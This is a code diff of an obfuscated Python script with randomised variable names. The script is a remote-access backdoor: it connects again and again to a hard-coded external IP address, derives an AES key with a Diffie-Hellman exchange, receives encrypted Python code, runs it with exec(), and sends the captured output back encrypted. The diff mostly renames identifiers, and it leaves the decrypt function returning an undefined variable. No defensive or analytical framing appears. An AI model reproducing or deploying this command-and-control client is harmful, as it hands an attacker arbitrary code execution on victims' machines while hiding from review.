@@ -17,19 +17,21 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa
 
-PhhKaaIGlzcOApEc = []
-actEeuViNdnAMUlceFqe_connections = []
 
-def WXAnuBouymmwsBUj(sig, frame):
 
-    for gCXaOYsiiDyOaKhr_socket in PhhKaaIGlzcOApEc:
-        gCXaOYsiiDyOaKhr_socket.close()
+egYAzOyVPByAXFog = []
+UUGKXokNuTEYlpnW = []
+
+def jiZSLWlzyNIEQQhw(sig, frame):
+
+    for QpkbIGBtxNFiqZbk_socket in egYAzOyVPByAXFog:
+        QpkbIGBtxNFiqZbk_socket.close()
 
     sys.exit(0)
 
-signal.signal(signal.SIGINT, WXAnuBouymmwsBUj)
+signal.signal(signal.SIGINT, jiZSLWlzyNIEQQhw)
 
-ArrfbaiCZKQRAFSl = """-----BEGIN RSA PUBLIC KEY-----
+OnKQMtQYboDtCtGn = """-----BEGIN RSA PUBLIC KEY-----
 MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
 Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
 9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYk2FMmPh0T50+buxyKFG2G220
@@ -44,22 +46,22 @@ l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
 -----END RSA PUBLIC KEY-----
 """
 
-ArrfbaiCZKQRAFSl = ArrfbaiCZKQRAFSl.encode('utf-8')
+kpDrudNGOUEtCZKy = OnKQMtQYboDtCtGn.encode('utf-8')
 
-OxDPlSRQInDYizYt = serialization.load_pem_public_key(ArrfbaiCZKQRAFSl)
+owUqUPmoEnHshgqB = serialization.load_pem_public_key(kpDrudNGOUEtCZKy)
 
-def dApKHBThlwSZWUVe(OxDPlSRQInDYizYt, code_snippet):
+def sbhOOJKIccTbcyCs(owUqUPmoEnHshgqB, BIWxZaIJQfXlIXIP):
 
-    sMUjHabZeQWlhzAt = OxDPlSRQInDYizYt.key_size
+    beboaqTdApahkgSj= owUqUPmoEnHshgqB.key_size
 
-    WShzHStbqzOaGzyw = (sMUjHabZeQWlhzAt // 8 ) - 2 * hashes.SHA256().digest_size - 2
+    uJWuPRjelaOfuRpx = (beboaqTdApahkgSj// 8 ) - 2 * hashes.SHA256().digest_size - 2
 
-    if len(code_snippet) > WShzHStbqzOaGzyw:
+    if len(BIWxZaIJQfXlIXIP) > uJWuPRjelaOfuRpx:
         sys.exit(0)
 
     try:
-        MGghJRpmSlKUMWmH = OxDPlSRQInDYizYt.encrypt(
-            code_snippet,
+        CpGxqdTcgpApYTel = owUqUPmoEnHshgqB.encrypt(
+            BIWxZaIJQfXlIXIP,
             padding.OAEP(
                 mgf=padding.MGF1(algorithm=hashes.SHA256()),
                 algorithm=hashes.SHA256(),
@@ -69,95 +71,97 @@ def dApKHBThlwSZWUVe(OxDPlSRQInDYizYt, code_snippet):
     except Exception as e:
         sys.exit(1)
 
-    XTuYMyUyZLzMwGMU = base64.b64encode(MGghJRpmSlKUMWmH).decode('utf-8')
-    return XTuYMyUyZLzMwGMU
+    hFwQNNfTYbFaeWfO = base64.b64encode(CpGxqdTcgpApYTel).decode('utf-8')
+    return hFwQNNfTYbFaeWfO
 
 
-def pnXPfGuoFRbJRgaX(gCXaOYsiiDyOaKhr):
-    nAXPBSQbBYQhIcLQ = gCXaOYsiiDyOaKhr.recv(4096)
-    nAXPBSQbBYQhIcLQ = nAXPBSQbBYQhIcLQ.decode()
+def KmykbRHpcOxKqJoe(QpkbIGBtxNFiqZbk):
+    sqCrRkWBejrVIwyP = QpkbIGBtxNFiqZbk.recv(4096)
+    sqCrRkWBejrVIwyP = sqCrRkWBejrVIwyP.decode()
 
-    n, g = nAXPBSQbBYQhIcLQ.split(',')
+    n, g = sqCrRkWBejrVIwyP.split(',')
     n = int(n)
     g = int(g)
 
     x = random.randint(1, n - 1)
-    yOadMMFZMnHNjIHP = int(pow(g, x, n))
+    yzjaXgGrJmvuxltg = int(pow(g, x, n))
 
-    yOadMMFZMnHNjIHP = str(yOadMMFZMnHNjIHP)
-    gCXaOYsiiDyOaKhr.send(yOadMMFZMnHNjIHP.encode())
+    yzjaXgGrJmvuxltg = str(yzjaXgGrJmvuxltg)
+    QpkbIGBtxNFiqZbk.send(yzjaXgGrJmvuxltg.encode())
 
-    TamuaPsZElfXnTNA = gCXaOYsiiDyOaKhr.recv(4096)
-    TamuaPsZElfXnTNA = int(TamuaPsZElfXnTNA.decode())
+    dcFSPGKJqpkJvIbn = QpkbIGBtxNFiqZbk.recv(4096)
+    dcFSPGKJqpkJvIbn = int(dcFSPGKJqpkJvIbn.decode())
 
-    EvqZkMijIgyZSNxN = pow(TamuaPsZElfXnTNA, x, n)
+    zzBNyDrigcjJGfNv = pow(dcFSPGKJqpkJvIbn, x, n)
 
-    pWnogkoEMHZalbyg = int.to_bytes(EvqZkMijIgyZSNxN, length=(EvqZkMijIgyZSNxN.bit_length() + 7) // 8, byteorder='big')
-    pWnogkoEMHZalbyg = hashlib.sha256(pWnogkoEMHZalbyg).digest()
+    yeUqRQBylGraniiu = int.to_bytes(zzBNyDrigcjJGfNv, length=(zzBNyDrigcjJGfNv.bit_length() + 7) // 8, byteorder='big')
+    yeUqRQBylGraniiu = hashlib.sha256(yeUqRQBylGraniiu).digest()
 
-    return pWnogkoEMHZalbyg
+    return yeUqRQBylGraniiu
 
 
-def FzsfxjmPKstKjBbv(ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH, rRGZAjZCulYKSgKB, lqgsgMiUDzFBiBzn):
+def aQxBeoFbaTfxOAgw(qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF, FiWurRomQeCDggUh, VCchrEErbxNcTmnI):
 
-    if (ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH) in actEeuViNdnAMUlceFqe_connections:
+    if (qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF) in UUGKXokNuTEYlpnW:
         return
 
-    gCXaOYsiiDyOaKhr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    QpkbIGBtxNFiqZbk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    gCXaOYsiiDyOaKhr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    QpkbIGBtxNFiqZbk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    PhhKaaIGlzcOApEc.append(gCXaOYsiiDyOaKhr)
+    egYAzOyVPByAXFog.append(QpkbIGBtxNFiqZbk)
 
     try:
-        gCXaOYsiiDyOaKhr.connect((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))
-        actEeuViNdnAMUlceFqe_connections.append((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))
+        QpkbIGBtxNFiqZbk.connect((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))
+        UUGKXokNuTEYlpnW.append((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))
         
-        pWnogkoEMHZalbyg = pnXPfGuoFRbJRgaX(gCXaOYsiiDyOaKhr)
+        yeUqRQBylGraniiu = KmykbRHpcOxKqJoe(QpkbIGBtxNFiqZbk)
 
-        cXTRcckyGERRRlPg = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
+        HmUWtwnTRFHSnBWG = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
         try:
-            encrypted_cXTRcckyGERRRlPg = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, cXTRcckyGERRRlPg.encode())
-            gCXaOYsiiDyOaKhr.send(encrypted_cXTRcckyGERRRlPg)
+            etzIlpnsHNDDrTyb = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, HmUWtwnTRFHSnBWG.encode())
+            QpkbIGBtxNFiqZbk.send(etzIlpnsHNDDrTyb)
         except Exception as e:
             pass
 
-        KGqxKdAfyksObSPN = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
+        rVtqyrfrVMjDUmHo = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
+
         try:
-            KGqxKdAfyksObSPN = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, KGqxKdAfyksObSPN.encode())
+            rVtqyrfrVMjDUmHo = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, rVtqyrfrVMjDUmHo.encode())
         except Exception as e:
             pass
 
 
         while True:
 
-            gCXaOYsiiDyOaKhr.send(KGqxKdAfyksObSPN)
+            QpkbIGBtxNFiqZbk.send(rVtqyrfrVMjDUmHo)
 
-            ZEFLLftPTwJSabdf = gCXaOYsiiDyOaKhr.recv(4096)
+            pBpSzPQUuLaogHMl = QpkbIGBtxNFiqZbk.recv(4096)
             try:
-                decrypted_ZEFLLftPTwJSabdf = cMMkISnHnklukBQR(pWnogkoEMHZalbyg, ZEFLLftPTwJSabdf)
+                TqFgXPWEcmvrEZux = NGgdlADhpmjHDtzN(yeUqRQBylGraniiu, pBpSzPQUuLaogHMl)
             except Exception as e:
                 continue
 
-            DZPSBJBmHDxYUADA = sys.stdout
-            qUsyDHXOMmHsMmvb = io.StringIO()
-            sys.stdout = qUsyDHXOMmHsMmvb
+            GMuxTHNpyamXvINw = sys.stdout
+            FGGHZfUMNgqWxFhY = io.StringIO()
+            sys.stdout = FGGHZfUMNgqWxFhY
 
             try:
-                exec(decrypted_ZEFLLftPTwJSabdf)
-                qphbcazvUvCVfemT = qUsyDHXOMmHsMmvb.getvalue()
-                if qphbcazvUvCVfemT:
-                    print(qphbcazvUvCVfemT)
-                elif qphbcazvUvCVfemT == "":
-                    qphbcazvUvCVfemT = "empty nAXPBSQbBYQhIcLQ"
+                exec(TqFgXPWEcmvrEZux)
+                EfSyrZtonGqBQjHA = FGGHZfUMNgqWxFhY.getvalue()
+                if EfSyrZtonGqBQjHA:
+                    print(EfSyrZtonGqBQjHA)
+                elif EfSyrZtonGqBQjHA == "":
+                    EfSyrZtonGqBQjHA = "empty sqCrRkWBejrVIwyP"
             except Exception as e:
-                qphbcazvUvCVfemT = e
+                EfSyrZtonGqBQjHA = e
             finally:
-                sys.stdout = DZPSBJBmHDxYUADA
+                sys.stdout = GMuxTHNpyamXvINw
 
+            print(EfSyrZtonGqBQjHA)
 
-            ZwGfVGYjPUdqTRuc = FIsBuVHVFDVsoTdv(pWnogkoEMHZalbyg, qphbcazvUvCVfemT.encode())
-            gCXaOYsiiDyOaKhr.send(ZwGfVGYjPUdqTRuc)
+            xUFNYjeeATjogiUf = cuDxwXGDQbUIWPUu(yeUqRQBylGraniiu, EfSyrZtonGqBQjHA.encode())
+            QpkbIGBtxNFiqZbk.send(xUFNYjeeATjogiUf)
 
             time.sleep(1)
 
@@ -166,47 +170,47 @@ def FzsfxjmPKstKjBbv(ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH, rRGZAjZCulYKSgKB, lqgsg
         pass
 
     finally:
-        if (ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH) in actEeuViNdnAMUlceFqe_connections:
-            actEeuViNdnAMUlceFqe_connections.remove((ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH))
+        if (qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF) in UUGKXokNuTEYlpnW:
+            UUGKXokNuTEYlpnW.remove((qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF))
 
-        gCXaOYsiiDyOaKhr.close()
+        QpkbIGBtxNFiqZbk.close()
 
-def FIsBuVHVFDVsoTdv(key, rwqKPQkhXmJdIHxB):
-    EeuViNdnAMUlceFq = os.urandom(16)
-    kCUrUMahkwRMHQiU = Cipher(algorithms.AES(key), modes.CBC(EeuViNdnAMUlceFq), backend=default_backend())
-    encryptor = kCUrUMahkwRMHQiU.encryptor()
+def cuDxwXGDQbUIWPUu(key, plaintext):
+    eLcjrutJWIQrcOny = os.urandom(16)
+    eUoVnsJFBtTaamlR = Cipher(algorithms.AES(key), modes.CBC(eLcjrutJWIQrcOny), backend=default_backend())
+    iyyBtOnhSnaAKKsp = eUoVnsJFBtTaamlR.encryptor()
 
-    JgJNolsSSDGHlioO = sym_padding.PKCS7(algorithms.AES.block_size).JgJNolsSSDGHlioO()
-    rUkvznzbNUnELkfB = JgJNolsSSDGHlioO.update(rwqKPQkhXmJdIHxB) + JgJNolsSSDGHlioO.finalize()
+    JGdExRMIUjteHNXL = sym_padding.PKCS7(algorithms.AES.block_size).padder()
+    EcKmtITtWpuRMEqP = JGdExRMIUjteHNXL.update(plaintext) + JGdExRMIUjteHNXL.finalize()
 
-    kCUrUMahkwRMHQiUtext = encryptor.update(rUkvznzbNUnELkfB) + encryptor.finalize()
-    return EeuViNdnAMUlceFq + kCUrUMahkwRMHQiUtext
+    eUoVnsJFBtTaamlRtext = iyyBtOnhSnaAKKsp.update(EcKmtITtWpuRMEqP) + iyyBtOnhSnaAKKsp.finalize()
+    return eLcjrutJWIQrcOny + eUoVnsJFBtTaamlRtext
 
-def cMMkISnHnklukBQR(key, encrypted_message):
-    EeuViNdnAMUlceFq = encrypted_message[:16]
-    kCUrUMahkwRMHQiUtext = encrypted_message[16:]
+def NGgdlADhpmjHDtzN(key, encrypted_message):
+    eLcjrutJWIQrcOny = encrypted_message[:16]
+    eUoVnsJFBtTaamlRtext = encrypted_message[16:]
 
-    kCUrUMahkwRMHQiU = Cipher(algorithms.AES(key), modes.CBC(EeuViNdnAMUlceFq), backend=default_backend())
-    gtxjDMjJCTKjxehv = kCUrUMahkwRMHQiU.gtxjDMjJCTKjxehv()
+    eUoVnsJFBtTaamlR = Cipher(algorithms.AES(key), modes.CBC(eLcjrutJWIQrcOny), backend=default_backend())
+    jipzrMDUxBVJZpyp = eUoVnsJFBtTaamlR.decryptor()
 
-    padded_rwqKPQkhXmJdIHxB = gtxjDMjJCTKjxehv.update(kCUrUMahkwRMHQiUtext) + gtxjDMjJCTKjxehv.finalize()
+    iydiXYefIErdfCoH = jipzrMDUxBVJZpyp.update(eUoVnsJFBtTaamlRtext) + jipzrMDUxBVJZpyp.finalize()
 
-    AOjWqKHTWgpmPnmK = sym_padding.PKCS7(algorithms.AES.block_size).AOjWqKHTWgpmPnmK()
-    rwqKPQkhXmJdIHxB = AOjWqKHTWgpmPnmK.update(padded_rwqKPQkhXmJdIHxB) + AOjWqKHTWgpmPnmK.finalize()
+    tOrGFbGwZxSszOrt = sym_padding.PKCS7(algorithms.AES.block_size).unpadder()
+    JQYabUXOMdtpFoFp= tOrGFbGwZxSszOrt.update(iydiXYefIErdfCoH) + tOrGFbGwZxSszOrt.finalize()
 
-    return rwqKPQkhXmJdIHxB.decode('utf-8')
+    return plaintext.decode('utf-8')
 
 
 if __name__ == "__main__":
 
-    ZWOHpKqqoBAUTUPl = "34.204.78.186"
-    blZjtYCrvtNVDuuH = int(65500)
-    rRGZAjZCulYKSgKB = prEeuViNdnAMUlceFqate_ip = "127.0.0.1"
-    lqgsgMiUDzFBiBzn = 1239
+    qrDhhQAoMpzBmXdG = "34.204.78.186"
+    BGGOhVEXBldGavZF = int(65500)
+    FiWurRomQeCDggUh = private_ip = "127.0.0.1"
+    VCchrEErbxNcTmnI = 1239
 
     while True:
         try:
-            FzsfxjmPKstKjBbv(ZWOHpKqqoBAUTUPl, blZjtYCrvtNVDuuH, rRGZAjZCulYKSgKB, lqgsgMiUDzFBiBzn)
+            aQxBeoFbaTfxOAgw(qrDhhQAoMpzBmXdG, BGGOhVEXBldGavZF, FiWurRomQeCDggUh, VCchrEErbxNcTmnI)
         except Exception as e:
             time.sleep(1)
             continue
